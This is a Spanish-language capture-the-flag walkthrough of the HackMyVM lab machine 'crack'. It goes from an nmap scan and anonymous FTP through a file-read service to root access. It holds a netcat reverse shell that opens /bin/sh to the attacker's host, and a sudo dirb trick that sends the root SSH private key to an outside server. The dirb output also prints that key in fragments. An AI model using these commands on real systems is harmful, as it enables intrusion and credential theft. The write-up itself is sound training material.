+++
title = 'crack - HackMyVM'
+++

[link de descarga de la máquina crack](https://downloads.hackmyvm.eu/crack.zip)

---

## Descubrimiento de máquina objetivo en la red con nmap

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/hackmyvm/crack/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.11**

## Escaneo de puertos en la máquina objetivo con nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.11 -oN target_scan.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Thu Sep 19 12:58:49 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n
       │  -Pn -oN target_scan.nmap 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up, received arp-response (0.00011s latency).
   4   │ Scanned at 2024-09-19 12:58:49 EDT for 2s
   5   │ Not shown: 65532 closed tcp ports (reset)
   6   │ PORT      STATE SERVICE        REASON
   7   │ 21/tcp    open  ftp            syn-ack ttl 64
   8   │ 4200/tcp  open  vrml-multi-use syn-ack ttl 64
   9   │ 12359/tcp open  unknown        syn-ack ttl 64
  10   │ MAC Address: 08:00:27:96:77:06 (Oracle VirtualBox virtual NIC)
  11   │ 
  12   │ Read data files from: /usr/bin/../share/nmap
  13   │ # Nmap done at Thu Sep 19 12:58:51 2024 -- 1 IP address (1 host up) scanned in 2.48 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 21,4200,12359**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p21,4200,12359 10.38.1.11 -oN scripts_exec.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scripts_exec.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Thu Sep 19 13:02:29 2024 as: nmap -sCV -p21,4200,12359 -oN scripts_exec.
       │ nmap 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up (0.00057s latency).
   4   │ 
   5   │ PORT      STATE SERVICE  VERSION
   6   │ 21/tcp    open  ftp      vsftpd 3.0.3
   7   │ | ftp-syst: 
   8   │ |   STAT: 
   9   │ | FTP server status:
  10   │ |      Connected to ::ffff:10.38.1.10
  11   │ |      Logged in as ftp
  12   │ |      TYPE: ASCII
  13   │ |      No session bandwidth limit
  14   │ |      Session timeout in seconds is 300
  15   │ |      Control connection is plain text
  16   │ |      Data connections will be plain text
  17   │ |      At session startup, client count was 1
  18   │ |      vsFTPd 3.0.3 - secure, fast, stable
  19   │ |_End of status
  20   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  21   │ |_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
  22   │ 4200/tcp  open  ssl/http ShellInABox
  23   │ | ssl-cert: Subject: commonName=crack
  24   │ | Not valid before: 2023-06-07T10:20:13
  25   │ |_Not valid after:  2043-06-02T10:20:13
  26   │ |_ssl-date: TLS randomness does not represent time
  27   │ |_http-title: Shell In A Box
  28   │ 12359/tcp open  unknown
  29   │ | fingerprint-strings: 
  30   │ |   GenericLines: 
  31   │ |     File to read:NOFile to read:
  32   │ |   NULL: 
  33   │ |_    File to read:
  34   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the foll
       │ owing fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  35   │ SF-Port12359-TCP:V=7.94SVN%I=7%D=9/19%Time=66EC5939%P=x86_64-pc-linux-gnu%
  36   │ SF:r(NULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:N
  37   │ SF:OFile\x20to\x20read:");
  38   │ MAC Address: 08:00:27:96:77:06 (Oracle VirtualBox virtual NIC)
  39   │ Service Info: OS: Unix
  40   │ 
  41   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  42   │ # Nmap done at Thu Sep 19 13:03:09 2024 -- 1 IP address (1 host up) scanned in 39.98 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Descarga de archivos del servidor FTP con wget

```bash
wget -m ftp://anonymous:anonymous@10.38.1.11
```

## Contenido de script crack.py que se ejecuta en el puerto 12359

```python
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: crack.py
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import os
   2   │ import socket
   3   │ s = socket.socket()
   4   │ s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   5   │ port = 12359
   6   │ s.bind(('', port))
   7   │ s.listen(50)
   8   │ 
   9   │ c, addr = s.accept()
  10   │ no = "NO"
  11   │ while True:
  12   │         try:
  13   │                 c.send('File to read:'.encode())
  14   │                 data = c.recv(1024)
  15   │                 file = (str(data, 'utf-8').strip())
  16   │                 filename = os.path.basename(file)
  17   │                 check = "/srv/ftp/upload/"+filename
  18   │                 if os.path.isfile(check) and os.path.isfile(file):
  19   │                         f = open(file,"r")
  20   │                         lines = f.readlines()
  21   │                         lines = str(lines)
  22   │                         lines = lines.encode()
  23   │                         c.send(lines)
  24   │                 else:
  25   │                         c.send(no.encode())
  26   │         except ConnectionResetError:
  27   │                 pass
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

**Para leer un archivo del sistema, uno con igual nombre debe ser subido al servidor ftp.**

```bash
-> ftp 10.38.1.11                              
Connected to 10.38.1.11.
220 (vsFTPd 3.0.3)
Name (10.38.1.11:fafi): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
229 Entering Extended Passive Mode (|||11060|)
150 Here comes the directory listing.
drwxrwxrwx    3 0        0            4096 Sep 19 20:10 upload
226 Directory send OK.

ftp> cd upload
250 Directory successfully changed.

ftp> put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||46954|)
150 Ok to send data.
100% |*******************************************************************|  1663       21.14 MiB/s    00:00 ETA
226 Transfer complete.
1663 bytes sent in 00:00 (1.11 MiB/s)


ftp> dir
229 Entering Extended Passive Mode (|||49332|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
-rw-------    1 107      114            73 Sep 19 20:10 passwd
226 Directory send OK.
```

## Lectura del archivo /etc/passwd

```bash
-> telnet 10.38.1.11 12359

Trying 10.38.1.11...
Connected to 10.38.1.11.
Escape character is '^]'.
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
```

## Login con credenciales cris:cris en el servicio shellinabox (puerto 4200)

```bash
crack login: cris                                                                                                                       
Password:                                                                                                                               
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                
                                                                                                                                        
The programs included with the Debian GNU/Linux system are free software;                                                               
the exact distribution terms for each program are described in the                                                                      
individual files in /usr/share/doc/*/copyright.                                                                                         
                                                                                                                                        
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                       
permitted by applicable law.                                                                                                            
Last login: Wed Jun  7 14:39:38 CEST 2023 from 192.168.0.100 on pts/0                                                                   
cris@crack:~$
```

## Reverse shell para trabajar desde la terminal

```bash
===============
shellinabox ↓↓↓
===============

cris@crack:~$ nc -e /bin/sh 10.38.1.10 4444 

=====================
Terminal en local ↓↓↓
=====================

-> nc -nlvp 4444
```
### Tratamiento de la tty

```bash
script /dev/null -c bash
[ctrl+z]
stty raw -echo;fg
reset xterm 
export TERM=xterm 
export SHELL=bash
stty rows <filas> columns <columnas> ## consultar con comando stty size
```

## Flag del usuario cris

```bash
cris@crack:~$ ls
crack.py  user.txt  ziempre.py
cris@crack:~$ cat user.txt
e**************HMV
```
## Permisos sudo del usuario cris

```bash
cris@crack:~$ sudo -l
Matching Defaults entries for cris on crack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cris may run the following commands on crack:
    (ALL) NOPASSWD: /usr/bin/dirb
```

## Escalada de privilegios

### Uso de /root/.ssh/id_rsa como wordlist

Ejecución de servidor en local con la herramienta [simplehttpserver](https://github.com/projectdiscovery/simplehttpserver)

```bash
sudo dirb http://10.38.1.10:8000 /root/.ssh/id_rsa
```

```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep 19 20:32:17 2024
URL_BASE: http://10.38.1.10:8000/
WORDLIST_FILES: /root/.ssh/id_rsa
OPTION: Show Not Existent Pages

-----------------

GENERATED WORDS: 38                                                            

---- Scanning URL: http://10.38.1.10:8000/ ----

+ http://10.38.1.10:8000/-----BEGIN (CODE:404|SIZE:19)                                                         
+ http://10.38.1.10:8000/b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k (CODE:404|SIZE:19)
+ http://10.38.1.10:8000//+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl (CODE:404|SIZE:19)
+ http://10.38.1.10:8000//RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC (CODE:404|SIZE:19)
+ http://10.38.1.10:8000/s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= (CODE:404|SIZE:19)                                 
+ http://10.38.1.10:8000/-----END (CODE:404|SIZE:19) 
```

![idrsa](/images/writeups/hackmyvm/crack/idrsaroot.png)


### Transferencia de id_rsa_root a la máquina objetivo

```bash
cris@crack:~$ wget http://10.38.1.10:8000/id_rsa_root
--2024-09-19 20:38:21--  http://10.38.1.10:8000/id_rsa_root
Conectando con 10.38.1.10:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2658 (2,6K) [text/plain]
Grabando a: «id_rsa_root»

id_rsa_root                 100%[===========================================>]   2,60K  --.-KB/s    en 0s      

2024-09-19 20:38:21 (182 MB/s) - «id_rsa_root» guardado [2658/2658]

cris@crack:~$ chmod 600 id_rsa_root

cris@crack:~$ ssh -i id_rsa_root root@localhost
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  7 22:11:49 2023
root@crack:~#
```

### Flag del usuario root

```bash
root@crack:~# whoami
root

root@crack:~# ls
root_fl4g.txt

root@crack:~# cat root_fl4g.txt 
w**************HMV
```

